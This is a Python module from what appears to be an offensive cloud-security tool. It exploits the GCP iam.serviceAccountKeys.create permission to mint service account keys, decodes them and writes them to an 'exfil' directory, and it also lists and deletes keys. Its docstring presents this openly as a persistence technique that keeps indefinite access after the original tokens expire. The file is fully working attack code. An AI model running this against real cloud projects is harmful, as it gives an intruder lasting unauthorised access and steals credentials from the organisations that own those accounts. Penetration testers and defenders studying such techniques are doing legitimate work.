"""
GCP Service Account Key Creation Module.

Exploits the iam.serviceAccountKeys.create permission to:
- Create persistent keys for service accounts
- Export keys for offline access
- Maintain persistence even after token expiration

This is a PERSISTENCE technique - once you have a key, you can
generate tokens indefinitely without needing the original access.

References:
- https://cloud.google.com/iam/docs/keys-create-delete
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
"""

import base64
import json
import os
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional, TYPE_CHECKING

import requests
from google.auth.transport.requests import Request  # PERF-008: Move import to module level
from rich.console import Console
from rich.prompt import Prompt, Confirm

from ...utils import parse_error  # DUP-005: Centralized error parsing

if TYPE_CHECKING:
    from ...gcp_session import GCPSessionManager

console = Console()

# IAM Admin API base URL
IAM_API_BASE = "https://iam.googleapis.com/v1"


def create_sa_key(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    output_dir: Optional[str] = None,
    key_type: str = "TYPE_GOOGLE_CREDENTIALS_FILE",
) -> Optional[Dict[str, Any]]:
    """
    Create a new key for a service account.

    Requires: iam.serviceAccountKeys.create on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        output_dir: Directory to save the key (default: ./exfil/gcp/keys/)
        key_type: Key type (TYPE_GOOGLE_CREDENTIALS_FILE or TYPE_PKCS12_FILE)

    Returns:
        Dictionary with key details and file path, or None on failure
    """
    console.print("\n[bold blue]🔑 Service Account Key Creation[/bold blue]")
    console.print("[dim]Exploiting: iam.serviceAccountKeys.create[/dim]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Target service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    # Validate email format
    if "@" not in service_account_email or ".iam.gserviceaccount.com" not in service_account_email:
        console.print("[yellow]Warning: Email doesn't look like a service account.[/yellow]")
        if not Confirm.ask("[cyan]Continue anyway?[/cyan]", default=False):
            return None

    # Extract project from SA email
    parts = service_account_email.split("@")
    project_id = parts[1].replace(".iam.gserviceaccount.com", "")

    console.print(f"[dim]Target: {service_account_email}[/dim]")
    console.print(f"[dim]Project: {project_id}[/dim]")

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # Create the key via API
    console.print("\n[cyan]Creating service account key...[/cyan]")

    resource_name = f"projects/{project_id}/serviceAccounts/{service_account_email}"
    url = f"{IAM_API_BASE}/{resource_name}/keys"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    body = {
        "privateKeyType": key_type,
    }

    try:
        response = requests.post(url, headers=headers, json=body, timeout=30)

        if response.status_code == 200:
            result = response.json()

            # Decode the private key data
            private_key_data = result.get("privateKeyData", "")
            if private_key_data:
                try:
                    key_json = base64.b64decode(private_key_data).decode("utf-8")
                    key_data = json.loads(key_json)
                except Exception:
                    key_json = private_key_data
                    key_data = {"raw": private_key_data}

                # Save the key
                if not output_dir:
                    output_dir = str(Path("./exfil/gcp/keys") / project_id)
                Path(output_dir).mkdir(parents=True, exist_ok=True)

                # Generate filename
                sa_name = service_account_email.split("@")[0]
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{sa_name}_{timestamp}.json"
                filepath = os.path.join(output_dir, filename)

                # Write key file
                with open(filepath, "w") as f:
                    if isinstance(key_data, dict) and "raw" not in key_data:
                        json.dump(key_data, f, indent=2)
                    else:
                        f.write(key_json)

                # Extract key metadata
                key_name = result.get("name", "")
                key_id = key_name.split("/")[-1] if key_name else "unknown"
                valid_after = result.get("validAfterTime", "")
                valid_before = result.get("validBeforeTime", "")

                console.print(f"\n[bold green]✅ Key created successfully![/bold green]")
                console.print(f"  [green]Key ID:[/green] {key_id}")
                console.print(f"  [green]Valid from:[/green] {valid_after}")
                console.print(f"  [green]Valid until:[/green] {valid_before}")
                console.print(f"  [green]Saved to:[/green] {filepath}")

                # Show how to use the key
                console.print("\n[bold yellow]📋 How to use this key:[/bold yellow]")
                console.print(f"[dim]  cloudknife gcp set_credentials {filepath}[/dim]")
                console.print(f"[dim]  # Or with gcloud:[/dim]")
                console.print(f"[dim]  gcloud auth activate-service-account --key-file={filepath}[/dim]")

                # Save to session
                key_result = {
                    "service_account": service_account_email,
                    "project": project_id,
                    "key_id": key_id,
                    "key_file": filepath,
                    "valid_after": valid_after,
                    "valid_before": valid_before,
                    "created_at": datetime.now().isoformat(),
                }
                session_mgr.save_enumeration_data(f"created_key_{sa_name}", key_result)

                return key_result

            else:
                console.print("[red]Key created but no private key data returned.[/red]")
                return None

        elif response.status_code == 403:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]Permission denied: {error_msg}[/red]")
            console.print("[dim]You need iam.serviceAccountKeys.create on this SA.[/dim]")
            return None

        elif response.status_code == 404:
            console.print(f"[red]Service account not found: {service_account_email}[/red]")
            return None

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def list_sa_keys(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    List all keys for a service account.

    Requires: iam.serviceAccountKeys.list on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email

    Returns:
        Dictionary with key list, or None on failure
    """
    console.print("\n[bold blue]🔑 List Service Account Keys[/bold blue]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    # Extract project from SA email
    parts = service_account_email.split("@")
    if len(parts) != 2:
        console.print("[red]Invalid service account email format.[/red]")
        return None

    project_id = parts[1].replace(".iam.gserviceaccount.com", "")

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # List keys via API
    resource_name = f"projects/{project_id}/serviceAccounts/{service_account_email}"
    url = f"{IAM_API_BASE}/{resource_name}/keys"

    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code == 200:
            data = response.json()
            keys = data.get("keys", [])

            console.print(f"[green]Found {len(keys)} key(s) for {service_account_email}[/green]\n")

            from rich.table import Table
            table = Table(title=f"Keys for {service_account_email}")
            table.add_column("Key ID", style="cyan", overflow="fold", no_wrap=False)
            table.add_column("Type")
            table.add_column("Valid After")
            table.add_column("Valid Before")
            table.add_column("Origin")

            for key in keys:
                key_name = key.get("name", "")
                key_id = key_name.split("/")[-1] if key_name else "unknown"
                key_type = key.get("keyType", "unknown")
                valid_after = key.get("validAfterTime", "")[:10] if key.get("validAfterTime") else "-"
                valid_before = key.get("validBeforeTime", "")[:10] if key.get("validBeforeTime") else "-"
                origin = key.get("keyOrigin", "unknown")

                # Highlight user-managed keys
                if key_type == "USER_MANAGED":
                    key_type = f"[yellow]{key_type}[/yellow]"

                table.add_row(key_id, key_type, valid_after, valid_before, origin)

            console.print(table)

            # Count user-managed keys (potential persistence)
            user_managed = [k for k in keys if k.get("keyType") == "USER_MANAGED"]
            if user_managed:
                console.print(f"\n[yellow]⚠️  {len(user_managed)} user-managed key(s) found (potential persistence)[/yellow]")

            return {"service_account": service_account_email, "keys": keys}

        elif response.status_code == 403:
            console.print("[red]Permission denied to list keys.[/red]")
            return None

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def delete_sa_key(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    key_id: Optional[str] = None,
) -> bool:
    """
    Delete a service account key.

    Requires: iam.serviceAccountKeys.delete on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        key_id: Key ID to delete

    Returns:
        True if successful, False otherwise
    """
    console.print("\n[bold blue]🗑️  Delete Service Account Key[/bold blue]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return False

    # Get key ID
    if not key_id:
        key_id = Prompt.ask("[cyan]Key ID to delete[/cyan]", default="")
        if not key_id:
            console.print("[red]Key ID is required.[/red]")
            return False

    # Extract project from SA email
    parts = service_account_email.split("@")
    project_id = parts[1].replace(".iam.gserviceaccount.com", "")

    # Confirm deletion
    if not Confirm.ask(f"[yellow]Delete key {key_id}?[/yellow]", default=False):
        console.print("[dim]Cancelled.[/dim]")
        return False

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return False

    # Delete key via API
    resource_name = f"projects/{project_id}/serviceAccounts/{service_account_email}/keys/{key_id}"
    url = f"{IAM_API_BASE}/{resource_name}"

    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.delete(url, headers=headers, timeout=30)

        if response.status_code == 200:
            console.print(f"[green]✅ Key {key_id} deleted successfully.[/green]")
            return True

        elif response.status_code == 403:
            console.print("[red]Permission denied to delete key.[/red]")
            return False

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return False

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return False
